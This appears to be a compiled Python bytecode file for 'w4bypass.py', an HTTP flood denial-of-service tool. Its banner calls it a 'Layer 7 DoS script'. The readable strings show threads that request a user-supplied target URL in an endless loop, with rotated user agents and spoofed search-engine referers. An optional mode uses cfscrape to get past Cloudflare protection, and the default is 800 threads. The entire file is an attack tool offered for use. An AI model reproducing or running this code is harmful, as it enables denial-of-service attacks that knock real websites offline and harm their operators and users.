ó
?_c           @   sý   d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d d d d d d d d	 g Z d
 d d g Z	 e j
   Z d e j f d     YZ d d d     YZ e d k rù d Z e   Z e j   n  d S(   iÿÿÿÿNs   https://duckduckgo.com/s   https://www.google.com/s   https://www.bing.com/s   https://www.yandex.ru/s   https://search.yahoo.com/s   https://www.facebook.com/s   https://twitter.com/s   https://www.youtube.com/sI   Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0sR   Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0sD   Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0t   Spammerc           B   s,   e  Z d    Z d   Z d   Z d   Z RS(   c         C   s5   t  j j |   | |  _ | |  _ t  j   |  _ d  S(   N(   t	   threadingt   Threadt   __init__t   urlt   numt   Lock(   t   selfR   t   number(    (    s   w4bypass.pyR      s    		c         C   s7   t  j |  j d d } d |  j |  j | j f GHd  S(   Nt   timeouti
   sA   | Thread #%s | CLOUDFLARE METHOD | Target: %s | HTTP Status: %s |(   t   scrapert   getR   R   t   status_code(   R   t   soso(    (    s   w4bypass.pyt   request_cloud   s    c         C   sy   t  j |  j d d d i t j t  d 6d d 6d d 6d	 d
 6d d 6t j t  d 6} d |  j |  j | j f GHd  S(   NR	   i
   t   headerss
   User-Agents?   text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8t   Accepts   en-US,en;q=0.5s   Accept-Languages   gzip, deflates   Accept-Encodingt   1t   DNTt   Referers=   | Thread #%s | NORMAL METHOD | Target: %s | HTTP Status: %s |(	   t   requestsR   R   t   randomt   choicet   uagzt   refR   R   (   R   t   ro(    (    s   w4bypass.pyt   request_default"   s    Zc         C   s<   x5 t  r7 y! t r |  j   n
 |  j   Wq q Xq Wd  S(   N(   t   Truet
   Cloud_ModeR   R   (   R   (    (    s   w4bypass.pyt   run&   s    	(   t   __name__t
   __module__R   R   R   R   (    (    (    s   w4bypass.pyR       s   			t   MainLoopc           B   s#   e  Z d    Z d   Z d   Z RS(   c         C   sx   t  j d k re t  j d  t  j d  d d d d	 d
 d g } t  j d | t j d d   n  d GHd GHd GHd  S(   Nt   ntt   dost   cet   clss   color at   at   bt   ct   dt   et   fs   color %si    i   s>         #################################################       s2   
	 Layer 7 DoS script / Original Coderz: Folleder
s!   	 W4coders icin hazirlanmistir 

(   R!   R"   R#   (   t   ost   namet   systemR   t   randint(   R   t   color(    (    s   w4bypass.pyR   2   s    $c         C   sn   | d | d | d | d d k r5 d | } n5 | d | d | d | d d k r` n
 d | } | S(   Ni    i   i   i   s   www.s   http://t   http(    (   R   R   (    (    s   w4bypass.pyt	   check_url<   s    ((
c         C   s  xH t  rJ y/ t d  } |  j |  } t j |  } PWq d GHq Xq WxA t  r y- t d  } | d k ry t  a Pn t a PWqN qN XqN Wx1 t  rÂ y t t d   } Wn d } n XPq Wd | t | f GHt j	 d  x+ t
 |  D] } t | | d	  j   qï Wd  S(
   Ns   > site url gir: s%   > Connection Problem - Check the sites9   > Methods = [y]Cloudflare Bypass / [Enter]Normal Attack: t   ys%   > Enter the number of threads [800]: i   s´   -----------------------------------------------------------
   Target:	%s
   CF Method:	%s
   Threads:	%d
-----------------------------------------------------------
> Starting...
i   i   (   R   t   inputR1   R   t   headR   t   Falset   intt   timet   sleept   rangeR    t   start(   R   R   t   sosit   ot
   num_threadt   i(    (    s   w4bypass.pyt   setupE   s8    			
(   R   R   R   R1   R?   (    (    (    s   w4bypass.pyR    0   s   	
		t   __main__i    (    (   R+   R   R7   R   t   syst   stringt   cfscrapeR   R   R   t   create_scraperR
   R   R    R    R   t   NR&   R?   (    (    (    s   w4bypass.pyt   <module>   s$   l		6	